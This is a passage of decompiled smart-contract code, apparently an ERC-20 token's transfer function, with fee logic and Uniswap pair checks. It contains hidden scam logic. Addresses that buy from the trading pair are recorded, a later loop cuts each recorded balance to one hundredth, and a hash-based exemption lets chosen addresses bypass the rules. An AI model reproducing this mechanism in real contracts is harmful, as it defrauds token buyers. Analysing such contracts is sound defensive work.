                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12228 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12228 + 32 len mem[_12228]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 13
                require arg2 <= balanceOf[address(msg.sender)]
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if this.address == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 0, 17
                                if not arg2:
                                    revert with 0, 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if this.address == arg1:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 0, 17
                        if not arg2:
                            revert with 0, 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 0, 17
                        if balanceOf[0] > !(arg2 * _fee / 100):
                            revert with 0, 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _7733 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_7733] = 26
                    mem[_7733 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 0, 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 0, 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11541 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11547 = mem[_11541]
                require mem[_11541] == mem[_11541 + 12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11565 = mem[64]
